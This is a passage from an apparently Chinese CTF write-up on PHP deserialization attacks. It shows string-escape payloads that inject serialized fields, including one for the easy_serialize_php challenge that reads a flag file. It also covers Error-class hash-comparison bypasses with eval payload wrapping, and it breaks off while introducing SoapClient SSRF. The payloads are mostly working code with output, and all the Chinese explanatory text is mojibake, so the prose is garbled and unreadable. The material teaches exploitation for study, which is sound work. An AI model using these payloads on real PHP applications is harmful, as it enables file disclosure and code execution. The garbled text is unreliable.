class="line">ååºåˆ—åŒ–åï¼šE:\æµè§ˆå™¨ä¸‹è½½\chrome\æ–°å»ºæ–‡ä»¶å¤¹\<span class="number">2</span>.php:<span class="number">21</span>:</span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;phone&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;12345678901&quot;</span></span><br><span class="line">  <span class="string">&#x27;email&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;734541725@qq.com&quot;</span></span><br><span class="line">  <span class="string">&#x27;nickname&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">198</span>) <span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span></span><br><span class="line">  <span class="string">&#x27;photo&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;config.php&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜è¦æ³¨æ„çš„ç‚¹å°±æ˜¯å› ä¸ºè¦ç»•è¿‡æ­£åˆ™ï¼Œæ‰€ä»¥nicknameâ†’nickname[]ï¼Œæ•°ç»„åºåˆ—åŒ–åå°±éœ€è¦é—­åˆ{ï¼Œæ‰€ä»¥</p><p><code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p><p>34ä¸ªwhereï¼Œå¹¶ä¸”éœ€è¦æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ª}æ¥é—­åˆå¤šå‡ºçš„{</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>[]=<span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">string</span>(<span class="number">24</span>) <span class="string">&quot;a:1:&#123;i:0;a:1:&#123;i:0;i:1;&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure><img src="../images/image-20221004202925741.png" alt="image-20221004202925741" style="zoom: 50%;" /><h3 id="è¿‡æ»¤åå­—ç¬¦å˜å°‘"><a href="#è¿‡æ»¤åå­—ç¬¦å˜å°‘" class="headerlink" title="è¿‡æ»¤åå­—ç¬¦å˜å°‘"></a>è¿‡æ»¤åå­—ç¬¦å˜å°‘</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ€è·¯ï¼šè¿‡æ»¤åå­—ç¬¦å‡å°‘ï¼Œä¼šåƒæ‰åé¢çš„å­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦è®¡ç®—è¿‡æ»¤å¤„åˆ°ç›®æ ‡å­ä¸²çš„é•¿åº¦</span><br><span class="line">è§ä¸‹é¢ä¾‹å­ï¼Œå› ä¸ºè¿™ç§æƒ…å†µéœ€è¦è§‚å¯Ÿåºåˆ—åŒ–å­—ç¬¦ä¸²æ‰èƒ½å¾—åˆ°è¿‡æ»¤å¤„åˆ°ç›®æ ‡å­ä¸²çš„é•¿åº¦ï¼Œè€Œä¸æ˜¯åƒè¿‡æ»¤åå­—ç¬¦å˜å¤šé‚£æ ·å¯ä»¥ç›´æ¥æ„é€ ã€‚</span><br></pre></td></tr></table></figure><h4 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h4><p>è¿‡æ»¤å‡½æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯æ§å˜é‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line">è¿˜æœ‰ä¸€ä¸ª<span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>]æ˜¯éœ€è¦æˆ‘ä»¬è¦†ç›–çš„å˜é‡</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–â†’è¿‡æ»¤â†’ååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>ç›®æ ‡å­ä¸²</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">base64_encode</span>(d0g3_f1ag.php)=<span class="string">&#x27;ZDBnM19mMWFnLnBocA==&#x27;</span></span><br><span class="line"><span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿåºåˆ—åŒ–å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;<span class="comment">//è¿‡æ»¤åå­—ç¬¦å‡å°‘3æˆ–è€…4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>] = <span class="string">&#x27;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;Z3Vlc3RfaW1nLnBuZw==&#x27;</span>;<span class="comment">//ä¸å¯æ§å˜é‡ï¼Œå›ºå®šå€¼base64_encode(&#x27;guest_img.png&#x27;)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&quot;è¿‡æ»¤å‰:&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>),<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿‡æ»¤å:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&gt;&gt;</span><br><span class="line">è¿‡æ»¤å‰:</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;</span><br><span class="line">s:<span class="number">41</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">è¿‡æ»¤å:</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:4:&quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">éœ€è¦è®¡ç®—è¿‡æ»¤å¤„åˆ°ç›®æ ‡å­ä¸²çš„é•¿åº¦ï¼š&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot; é•¿åº¦ä¸º23ï¼Œä¸ä¸º3æˆ–4çš„å€æ•°ï¼Œæœ€æ¥è¿‘çš„æ˜¯24ï¼Œæ‰€ä»¥åœ¨</span></span><br><span class="line"><span class="string">ç›®æ ‡å­ä¸²å¤´æ·»åŠ ä»»æ„ä¸€ä¸ªå­—ç¬¦å˜æˆa&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">æ‰€ä»¥è¿‡æ»¤åä¼šåƒæ‰<span class="number">24</span>ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å¯ä»¥é€‰æ‹©<span class="number">4</span>*<span class="number">6</span>æˆ–è€…<span class="number">3</span>*<span class="number">8</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;<span class="comment">//è¿‡æ»¤åå­—ç¬¦å‡å°‘</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>]=<span class="string">&#x27;flagflagflagflagflagflag&#x27;</span>;<span class="comment">//è¿‡æ»¤åå‘ååƒ24ä¸ªå­—ç¬¦ï¼Œæˆ–è€…php*8</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>]=<span class="string">&#x27;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:4:&quot;khaz&quot;;s:4:&quot;haha&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;Z3Vlc3RfaW1nLnBuZw==&#x27;</span>;<span class="comment">//ä¸å¯æ§å˜é‡ï¼Œå›ºå®šå€¼</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&quot;è¿‡æ»¤å‰:&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>),<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¿‡æ»¤å:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"></span><br><span class="line">è¿‡æ»¤å‰:</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">è¿‡æ»¤å:</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:24:&quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">E:\xampp2\php\www\2.php:19:</span></span><br><span class="line"><span class="string">array(3) &#123;</span></span><br><span class="line"><span class="string">  &#x27;user&#x27; =&gt;</span></span><br><span class="line"><span class="string">  string(24) &quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="string">&#x27;img&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">20</span>) <span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span></span><br><span class="line">  <span class="string">&#x27;khaz&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;haha&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;æ·»åŠ äº†è¿™ä¸ªæ˜¯å› ä¸º<span class="variable">$_SESSION</span>æœ‰ä¸‰ä¸ªå€¼(a:<span class="number">3</span>),æ•°é‡è¦å¯¹çš„ä¸Šæ‰èƒ½ååºåˆ—åŒ–</span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line">s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;</span><br></pre></td></tr></table></figure><h1 id="åŸç”Ÿç±»åˆ©ç”¨"><a href="#åŸç”Ÿç±»åˆ©ç”¨" class="headerlink" title="åŸç”Ÿç±»åˆ©ç”¨"></a>åŸç”Ÿç±»åˆ©ç”¨</h1><h2 id="å¸¸è§åœºæ™¯"><a href="#å¸¸è§åœºæ™¯" class="headerlink" title="å¸¸è§åœºæ™¯"></a>å¸¸è§åœºæ™¯</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">key</span>(<span class="variable">$this</span>-&gt;value);</span><br></pre></td></tr></table></figure><h2 id="è·å–æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»"><a href="#è·å–æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»" class="headerlink" title="è·å–æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»"></a>è·å–æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>(); <span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>); <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>( <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__toString&#x27;</span>, <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__callStatic&#x27;</span>, <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__unset&#x27;</span>, <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>å¯ä»¥æ ¹æ®é¢˜ç›®ç¯å¢ƒå°†æŒ‡å®šçš„æ–¹æ³•æ·»åŠ è¿›æ¥, æ¥éå†å­˜åœ¨æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»</p><p>æ¯”å¦‚è¯´é¢˜ç›®ç»™çš„ä»£ç æœ‰MD5ï¼Œevalç­‰ï¼Œè¿™äº›å‡½æ•°çš„å‚æ•°éƒ½æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥è§¦å‘<code>__tostring</code>é­”æœ¯æ–¹æ³•</p></blockquote><h2 id="Error-x2F-Exception-ç±»"><a href="#Error-x2F-Exception-ç±»" class="headerlink" title="Error&#x2F;Exception ç±»"></a>Error&#x2F;Exception ç±»</h2><blockquote><p>ç”¨äºè‡ªå®šä¹‰é”™è¯¯ç±»å‹çš„</p></blockquote><table><thead><tr><th align="center">ç±»</th><th align="center">é€‚ç”¨ç‰ˆæœ¬</th><th align="center">å±æ€§ï¼ˆä¸€æ ·çš„ï¼‰</th></tr></thead><tbody><tr><td align="center">Error</td><td align="center">php7</td><td align="center">messageï¼šå¼‚å¸¸æ¶ˆæ¯å†…å®¹                                                           fileï¼šæŠ›å‡ºå¼‚å¸¸çš„æ–‡ä»¶å</td></tr><tr><td align="center">Exception</td><td align="center">php5&#x2F;php7</td><td align="center">lineï¼šæŠ›å‡ºå¼‚å¸¸åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œå·                                         codeï¼šå¼‚å¸¸ä»£ç </td></tr></tbody></table><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line"><span class="built_in">Error</span>: payload in D:\phpstudy_pro\phpstudy_pro\WWW\test\<span class="number">1</span>.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Error</span>: payload in D:\phpstudy_pro\phpstudy_pro\WWW\test\<span class="number">1</span>.php:<span class="number">3</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure><p>ä»”ç»†è§‚å¯Ÿä¼šå‘ç°åªæœ‰å¼‚å¸¸ä»£ç codeæ²¡æœ‰è¢«è¾“å‡ºï¼Œå¹¶ä¸”åªæœ‰è¡Œå·lineä¸åŒ</p><p>åˆ©ç”¨</p><blockquote><p>å¯ç”¨æ¥ç»•è¿‡ç±»å±æ€§çš„å“ˆå¸Œæ¯”è¾ƒ</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($a)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($b)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($a)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($b)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>===<span class="variable">$b</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ç›¸åŒ&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ä¸ç›¸åŒ&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807151831343.png" alt="image-20220807151831343"></p><blockquote><p>å€¼ä¸ç›¸åŒï¼ˆå¯¹è±¡ï¼Œå¼‚å¸¸ä»£ç ä¸åŒï¼‰,md5å’Œsha1çš„å€¼ç›¸åŒï¼ˆè¾“å‡ºçš„æ˜¯ä¸€æ ·çš„ï¼‰</p></blockquote><h3 id="æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )</span><br><span class="line">    </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br></pre></td></tr></table></figure><p>å¤šäº†ä¸€ä¸ªeval</p><p>åªéœ€è¦å°†payloadæ„é€ ä¸º<code>?&gt;&lt;? payload?&gt;</code>çš„å½¢å¼å³å¯,å‰é¢çš„<code>?&gt;</code>æŠŠæ–‡ä»¶åŸæ¥çš„<code>&lt;?php</code>é—­åˆäº†ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>( <span class="meta">?&gt;</span>    <span class="meta">&lt;?php</span> payload <span class="meta">?&gt;</span>        )    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SoapClientç±»"><a href="#SoapClientç±»" class="headerlink" title="SoapClientç±»"></a>SoapClientç±»</h2><blockquote><p>å†…ç½®callæ–¹æ³•ï¼Œå½“callæ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œå°±ä¼šå‘èµ·httpè¯·æ±‚ï¼Œå¯ä»¥ä¼ªé€ ssrfè¯·æ±‚</p><p>å¹¶å› ä¸ºå¯ä»¥è‡ªå®šä¹‰user_agentè¯·æ±‚å¤´ä»è€Œé€ æˆcrlfæ¼æ´ã€‚</p></blockquote><p>å¯èƒ½ä¼šå‡ºç°çš„é—®é¢˜<a href="https://stackoverflow.com/questions/11391442/fatal-error-class-soapclient-not-found">Fatal error: Uncaught Error: Class â€˜SoapClientâ€™ not found 